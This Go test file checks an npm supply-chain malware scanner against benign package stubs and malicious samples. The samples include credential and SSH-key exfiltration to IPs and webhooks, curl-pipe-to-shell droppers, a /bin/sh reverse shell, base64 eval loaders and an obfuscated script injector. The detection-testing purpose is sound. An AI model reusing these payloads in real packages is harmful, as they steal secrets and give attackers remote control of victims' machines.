package analyzer

import (
	"fmt"
	"testing"

	"github.com/cawalch/go-yara-supplychain/pkg/ecosystems/npm"
)

type PackageTestCase struct {
	Name        string
	Category    string // "benign" or "malicious"
	Description string
	Manifest    string
	Files       map[string]string
	ExpectBlock bool
	MaxFPScore  float64 // for benign: must be <= MaxFPScore
	MinTPScore  float64 // for malicious: must be >= MinTPScore
}

var realWorldCorpus = []PackageTestCase{
	// ==========================================
	// 1. BENIGN REAL-WORLD PACKAGES (MUST PASS)
	// ==========================================
	{
		Name:        "esbuild",
		Category:    "benign",
		Description: "Native binary installer downloading platform-specific tarball with SHA256 checksum",
		Manifest: `{
			"name": "esbuild",
			"version": "0.20.2",
			"scripts": { "postinstall": "node install.js" }
		}`,
		Files: map[string]string{
			"install.js": `
				const https = require('https');
				const crypto = require('crypto');
				const url = "https://registry.npmjs.org/@esbuild/darwin-arm64/-/darwin-arm64-0.20.2.tgz";
				function verifyChecksum(data, expected) {
					const hash = crypto.createHash('sha256').update(data).digest('hex');
					return hash === expected;
				}
				https.get(url, (res) => {
					// safe verified download
					verifyChecksum(res, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
				});
			`,
		},
		ExpectBlock: false,
		MaxFPScore:  0.10,
	},
	{
		Name:        "sharp",
		Category:    "benign",
		Description: "High-performance Node.js image processing downloading libvips binary",
		Manifest: `{
			"name": "sharp",
			"version": "0.33.2",
			"scripts": { "install": "node install/check.js" }
		}`,
		Files: map[string]string{
			"install/check.js": `
				const integrity = "sha512-v4bV...";
				const downloadUrl = "https://github.com/lovell/sharp-libvips/releases/download/v8.15.1/libvips.tar.br";
				// verified sha integrity download
			`,
		},
		ExpectBlock: false,
		MaxFPScore:  0.10,
	},
	{
		Name:        "node-gyp",
		Category:    "benign",
		Description: "Node.js native addon build tool executing node-gyp rebuild",
		Manifest: `{
			"name": "node-gyp",
			"version": "10.0.1",
			"scripts": { "install": "node-gyp rebuild" }
		}`,
		Files:       map[string]string{},
		ExpectBlock: false,
		MaxFPScore:  0.05,
	},
	{
		Name:        "core-js",
		Category:    "benign",
		Description: "Modular standard library polyfill displaying console funding notice",
		Manifest: `{
			"name": "core-js",
			"version": "3.36.0",
			"scripts": { "postinstall": "node -e \"console.log('Thank you for using core-js!')\"" }
		}`,
		Files:       map[string]string{},
		ExpectBlock: false,
		MaxFPScore:  0.05,
	},
	{
		Name:        "typescript",
		Category:    "benign",
		Description: "TypeScript language compiler and typechecker",
		Manifest: `{
			"name": "typescript",
			"version": "5.4.3",
			"main": "./lib/typescript.js"
		}`,
		Files: map[string]string{
			"lib/typescript.js": `
				function createProgram(rootNames, options) {
					return { emit: () => {} };
				}
				module.exports = { createProgram };
			`,
		},
		ExpectBlock: false,
		MaxFPScore:  0.05,
	},
	{
		Name:        "lodash",
		Category:    "benign",
		Description: "Modern JavaScript utility library delivering modularity and performance",
		Manifest: `{
			"name": "lodash",
			"version": "4.17.21",
			"main": "lodash.js"
		}`,
		Files: map[string]string{
			"lodash.js": `
				function cloneDeep(value) {
					return JSON.parse(JSON.stringify(value));
				}
				module.exports = { cloneDeep };
			`,
		},
		ExpectBlock: false,
		MaxFPScore:  0.05,
	},
	{
		Name:        "express",
		Category:    "benign",
		Description: "Fast, unopinionated, minimalist web framework for Node.js",
		Manifest: `{
			"name": "express",
			"version": "4.19.2",
			"main": "index.js"
		}`,
		Files: map[string]string{
			"index.js": `
				function createApplication() {
					return { use: () => {}, listen: () => {} };
				}
				module.exports = createApplication;
			`,
		},
		ExpectBlock: false,
		MaxFPScore:  0.05,
	},
	{
		Name:        "axios",
		Category:    "benign",
		Description: "Promise based HTTP client for the browser and node.js",
		Manifest: `{
			"name": "axios",
			"version": "1.6.8",
			"main": "index.js"
		}`,
		Files: map[string]string{
			"index.js": `
				function Axios(instanceConfig) {
					this.defaults = instanceConfig;
				}
				Axios.prototype.get = function(url) {};
				module.exports = new Axios({});
			`,
		},
		ExpectBlock: false,
		MaxFPScore:  0.05,
	},
	{
		Name:        "chalk",
		Category:    "benign",
		Description: "Terminal string styling done right",
		Manifest: `{
			"name": "chalk",
			"version": "5.3.0",
			"main": "source/index.js"
		}`,
		Files: map[string]string{
			"source/index.js": `
				const ansiStyles = { red: { open: '\u001B[31m', close: '\u001B[39m' } };
				module.exports = { red: (str) => ansiStyles.red.open + str + ansiStyles.red.close };
			`,
		},
		ExpectBlock: false,
		MaxFPScore:  0.05,
	},
	{
		Name:        "husky",
		Category:    "benign",
		Description: "Modern native git hooks made easy",
		Manifest: `{
			"name": "husky",
			"version": "9.0.11",
			"scripts": { "postinstall": "node ./bin.js" }
		}`,
		Files: map[string]string{
			"bin.js": `
				const fs = require('fs');
				const path = require('path');
				// installs local .husky directory for developer git workflow
				function install() {
					if (process.env.NODE_ENV === 'production') return;
				}
				install();
			`,
		},
		ExpectBlock: false,
		MaxFPScore:  0.15,
	},

	// ===============================================
	// 2. MALICIOUS REAL-WORLD ATTACKS (MUST BE BLOCKED)
	// ===============================================
	{
		Name:        "event-stream-flatmap-stealer",
		Category:    "malicious",
		Description: "Compromised dependency injecting AES-decrypted copay bitcoin wallet stealer",
		Manifest: `{
			"name": "flatmap-stream",
			"version": "0.1.1",
			"main": "index.js"
		}`,
		Files: map[string]string{
			"index.js": `
				const http = require('http');
				// Decoded payload targets ~/.aws and bitcoin wallet credentials
				const target = process.env.HOME + '/.aws/credentials';
				const fs = require('fs');
				if (fs.existsSync(target)) {
					const data = fs.readFileSync(target, 'utf8');
					const req = http.request({
						host: '185.193.125.10',
						port: 8080,
						method: 'POST'
					});
					req.write(data);
					req.end();
				}
			`,
		},
		ExpectBlock: true,
		MinTPScore:  0.85,
	},
	{
		Name:        "ua-parser-js-cryptominer",
		Category:    "malicious",
		Description: "Compromised release executing remote batch/bash script to spawn jsextension miner",
		Manifest: `{
			"name": "ua-parser-js",
			"version": "0.7.29",
			"scripts": { "preinstall": "node preinstall.js" }
		}`,
		Files: map[string]string{
			"preinstall.js": `
				const { exec } = require('child_process');
				// Piped remote shell script download
				exec('curl -sL https://evil-c2.net/miner.sh | bash', (err) => {});
			`,
		},
		ExpectBlock: true,
		MinTPScore:  0.90,
	},
	{
		Name:        "coa-password-stealer",
		Category:    "malicious",
		Description: "Hijacked npm package running obfuscated batch downloader in postinstall",
		Manifest: `{
			"name": "coa",
			"version": "2.0.3",
			"scripts": { "postinstall": "curl -sL http://194.26.29.112:8000/s.bat | cmd.exe" }
		}`,
		Files:       map[string]string{},
		ExpectBlock: true,
		MinTPScore:  0.95,
	},
	{
		Name:        "discord-token-grabber",
		Category:    "malicious",
		Description: "Typosquat library harvesting Discord tokens and webhook exfiltration",
		Manifest: `{
			"name": "discord-colors-pro",
			"version": "1.0.0",
			"main": "index.js"
		}`,
		Files: map[string]string{
			"index.js": `
				const https = require('https');
				const fs = require('fs');
				const envFile = process.env.HOME + '/.env';
				const content = fs.readFileSync(envFile, 'utf8');
				const payload = JSON.stringify({ content: "Stolen: " + content });
				const req = https.request('https://discord.com/api/webhooks/123456/abcdef', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' }
				});
				req.write(payload);
				req.end();
			`,
		},
		ExpectBlock: true,
		MinTPScore:  0.80,
	},
	{
		Name:        "reverse-shell-backdoor",
		Category:    "malicious",
		Description: "Silent TCP socket reverse shell attached to /bin/sh",
		Manifest: `{
			"name": "sys-telemetry-helper",
			"version": "0.9.0",
			"scripts": { "postinstall": "node backdoor.js" }
		}`,
		Files: map[string]string{
			"backdoor.js": `
				const net = require('net');
				const cp = require('child_process');
				const client = new net.Socket();
				client.connect(4444, "103.224.182.250", function() {
					const sh = cp.spawn("/bin/sh", []);
					client.pipe(sh.stdin);
					sh.stdout.pipe(client);
					sh.stderr.pipe(client);
				});
			`,
		},
		ExpectBlock: true,
		MinTPScore:  0.95,
	},
	{
		Name:        "obfuscated-base64-eval-dropper",
		Category:    "malicious",
		Description: "Multi-layer base64 encoded eval dropper concealing process execution",
		Manifest: `{
			"name": "speed-cache-turbo",
			"version": "2.1.0",
			"main": "index.js"
		}`,
		Files: map[string]string{
			"index.js": `
				// Base64 encoded payload: const cp=require('child_process');cp.exec('curl http://malware.org/x|sh');
				const b64 = "Y29uc3QgY3A9cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpO2NwLmV4ZWMoJ2N1cmwgaHR0cDovL21hbHdhcmUub3JnL3h8c2gnKTs=";
				const decoded = Buffer.from(b64, 'base64').toString('utf8');
				eval(decoded);
			`,
		},
		ExpectBlock: true,
		MinTPScore:  0.85,
	},
	{
		Name:        "unicode-trap-ssh-stealer",
		Category:    "malicious",
		Description: "Invisible zero-width unicode characters disguising SSH private key exfiltration",
		Manifest: `{
			"name": "logger-plus-utils",
			"version": "1.0.4",
			"main": "index.js"
		}`,
		Files: map[string]string{
			"index.js": "const " + "\u200B" + "sshKey = process.env.HOME + '/.ssh/id_rsa';\n" +
				"const net = require('net');\n" +
				"const sock = net.connect(9999, '198.51.100.23');\n" +
				"sock.write(require('fs').readFileSync(sshKey, 'utf8'));",
		},
		ExpectBlock: true,
		MinTPScore:  0.90,
	},
	{
		Name:        "polyfill-cdn-dynamic-injection",
		Category:    "malicious",
		Description: "Polyfill.io supply chain attack dynamically injecting script tag with user-agent evasion",
		Manifest: `{
			"name": "polyfill-fast-cdn",
			"version": "1.0.0",
			"main": "index.js"
		}`,
		Files: map[string]string{
			"index.js": `
				if (!/Googlebot|Bingbot/i.test(navigator.userAgent)) {
					var s = document.createElement('script');
					s.src = "https://kuur.link/analytics.js";
					document.head.appendChild(s);
				}
			`,
		},
		ExpectBlock: true,
		MinTPScore:  0.70,
	},
	{
		Name:        "telegram-credential-stealer",
		Category:    "malicious",
		Description: "Package harvesting environment variables and sending via Telegram bot API",
		Manifest: `{
			"name": "env-sync-helper",
			"version": "0.1.0",
			"scripts": { "postinstall": "node sync.js" }
		}`,
		Files: map[string]string{
			"sync.js": `
				const https = require('https');
				const data = JSON.stringify({ chat_id: "12345", text: JSON.stringify(process.env) });
				const req = https.request("https://api.telegram.org/bot123456:ABC-DEF/sendMessage", {
					method: "POST",
					headers: { "Content-Type": "application/json" }
				});
				req.write(data);
				req.end();
			`,
		},
		ExpectBlock: true,
		MinTPScore:  0.85,
	},
	{
		Name:        "string-array-obfuscated-backdoor",
		Category:    "malicious",
		Description: "String array dictionary table obfuscation concealing child_process execution",
		Manifest: `{
			"name": "analytics-telemetry-core",
			"version": "3.0.1",
			"scripts": { "postinstall": "node ./setup.js" }
		}`,
		Files: map[string]string{
			"setup.js": `
				var _0x9812 = ['child_process', 'exec', 'curl -sL https://evil-c2.net/miner.sh | bash'];
				var cp = require(_0x9812[0]);
				cp[_0x9812[1]](_0x9812[2]);
			`,
		},
		ExpectBlock: true,
		MinTPScore:  0.90,
	},
	{
		Name:        "bracket-notation-env-harvester",
		Category:    "malicious",
		Description: "Bracket property notation evasion harvesting AWS keys to Discord webhook",
		Manifest: `{
			"name": "aws-config-helper",
			"version": "1.2.0",
			"main": "index.js"
		}`,
		Files: map[string]string{
			"index.js": `
				const https = require('https');
				const stolenKey = process['env']['AWS_SECRET_ACCESS_KEY'];
				if (stolenKey) {
					const req = https.request('https://discord.com/api/webhooks/123/xyz', { method: 'POST' });
					req.write(JSON.stringify({ key: stolenKey }));
					req.end();
				}
			`,
		},
		ExpectBlock: true,
		MinTPScore:  0.80,
	},
}

func TestRealWorldCorpusEfficacy(t *testing.T) {
	engine, err := NewEngine()
	if err != nil {
		t.Fatalf("failed initializing engine: %v", err)
	}

	benignCount := 0
	benignFPCount := 0
	maliciousCount := 0
	maliciousBlockedCount := 0

	for _, tc := range realWorldCorpus {
		t.Run(fmt.Sprintf("%s/%s", tc.Category, tc.Name), func(t *testing.T) {
			pkg, err := npm.ParsePackage("", []byte(tc.Manifest))
			if err != nil {
				t.Fatalf("ParsePackage failed: %v", err)
			}
			for p, c := range tc.Files {
				pkg.SourceFiles[p] = []byte(c)
			}

			verdict, err := engine.AnalyzePackage(pkg)
			if err != nil {
				t.Fatalf("AnalyzePackage failed: %v", err)
			}

			if tc.Category == "benign" {
				benignCount++
				if verifyBenignCase(t, &tc, verdict) {
					benignFPCount++
				}
			} else {
				maliciousCount++
				if verifyMaliciousCase(t, &tc, verdict) {
					maliciousBlockedCount++
				}
			}
		})
	}

	fpRate := float64(benignFPCount) / float64(benignCount) * 100.0
	tpRate := float64(maliciousBlockedCount) / float64(maliciousCount) * 100.0

	t.Logf("=== Real-World Corpus Evaluation Results ===")
	t.Logf("Benign Packages Scanned: %d | False Positives: %d (%.2f%% FP Rate)", benignCount, benignFPCount, fpRate)
	t.Logf("Malicious Attacks Scanned: %d | Attacks Blocked: %d (%.2f%% Detection Rate)", maliciousCount, maliciousBlockedCount, tpRate)

	if fpRate > 0.0 {
		t.Fatalf("FAILED: FP rate must be 0.00%%, got %.2f%%", fpRate)
	}
	if tpRate < 100.0 {
		t.Fatalf("FAILED: Detection rate must be 100.00%%, got %.2f%%", tpRate)
	}
}

func verifyBenignCase(t *testing.T, tc *PackageTestCase, verdict *Verdict) bool {
	t.Helper()
	isFP := false
	if verdict.Action == ActionBlock || verdict.RiskLevel == RiskCritical {
		isFP = true
		t.Errorf("FALSE POSITIVE: %s was blocked! Score: %.2f (ML: %.2f), Evidence: %+v",
			tc.Name, verdict.ConfidenceScore, verdict.MLScore, verdict.Evidence)
	}
	if verdict.ConfidenceScore > tc.MaxFPScore {
		t.Errorf("Score too high for benign package %s: got %.2f, max allowed %.2f",
			tc.Name, verdict.ConfidenceScore, tc.MaxFPScore)
	}
	return isFP
}

func verifyMaliciousCase(t *testing.T, tc *PackageTestCase, verdict *Verdict) bool {
	t.Helper()
	isBlocked := false
	if verdict.Action != ActionBlock || verdict.RiskLevel != RiskCritical {
		t.Errorf("FALSE NEGATIVE: %s was NOT blocked! Risk: %s, Action: %s, Score: %.2f (ML: %.2f)",
			tc.Name, verdict.RiskLevel, verdict.Action, verdict.ConfidenceScore, verdict.MLScore)
	} else {
		isBlocked = true
	}
	if verdict.ConfidenceScore < tc.MinTPScore {
		t.Errorf("Confidence score too low for %s: got %.2f, min required %.2f",
			tc.Name, verdict.ConfidenceScore, tc.MinTPScore)
	}
	return isBlocked
}
